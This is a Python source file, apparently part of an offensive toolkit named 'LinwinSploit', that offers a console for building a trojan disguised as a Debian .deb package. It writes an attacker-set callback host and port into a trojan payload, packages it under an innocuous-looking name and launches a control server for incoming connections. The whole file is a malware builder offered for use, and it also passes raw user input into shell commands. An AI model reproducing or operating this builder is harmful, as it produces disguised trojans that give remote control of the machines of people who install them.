import main
import os

class options():
    port: int = 8888
    package_name: str = "com.app.linwinsoft"
    make_path: str = os.environ['HOME']
    host: str = ""

op = options()

def make_deb_package(runpath: str):

    o = open(runpath+"/../Module/program/python/trojan_virus/trojan_virus.py")
    with open( runpath + "/../Module/linux/amd64/trojan_virus/build/usr/1/program.py" , "w") as f:
        f.write("connect: str=\""+op.host+"\"\n")
        f.write("port: int="+str(op.port))
        f.write(o.read())
    f.close()

    os.system("cd "+runpath + "/../Module/linux/amd64/trojan_virus/ && ./build.sh "+op.package_name+" "+op.make_path+" "+str(op.port)+" "+op.host)


def show_options():
    print()
    print(" ++++")
    print(" | host: " + op.host)
    print(" | port: " + str(op.port))
    print(" | package name: " + op.package_name)
    print(" | deb path: "+ op.make_path)
    print(" | payload name: linux/amd64/trojan_virus")
    print(" ++++")
    print()

def console(runpath: str):
    print("Enter 'help' to get help.")
    print("Enter 'make' to make a new trojan virus (.deb).")
    print("Enter 'exit' to exit")
    print()

    while True:
        command = input("LinwinSploit - [linux/amd64/trojan_virus] > ").strip()

        if command == 'help':
            print("""
 1. trojan_virus                        Make a new trojan virus file.
 2. set port [local port]               Start a port on the local host.
 3. set host [connect host]             Set the host for the virus connect.
 4. set path [path]                     Set Deb file make path.
 5. set name [package name]             Set package name of the deb file.   
 3. run                                 Run the Trojan virus Service.
 4. show options                        Show all the options you must input
            """)
            continue

        if command.startswith("set port "):
            try :
                port: int = int(command[9:len(command)])
                op.port = port

            except:
                print("input error")
                continue

        if command.startswith("set host "):
            try:
                op.host = command[9:len(command)]
            except:
                print("input error")
                continue

        if command.startswith("set path "):
            try:
                op.make_path = command[9:len(command)]
            except:
                print("input error")
                continue
        
        if command.startswith("set name "):
            try:
                op.package_name = command[9:len(command)]
            except:
                print("input error")
                continue

        if command == 'show options':
            show_options()

        if command == 'make':
            make_deb_package(runpath)
            continue

        if command == 'run':
            os.system("python3 "+runpath+"/../Module/program/python/trojan_virus/control.py "+str(op.port))
            continue
            
        if command == 'exit':
            main.main()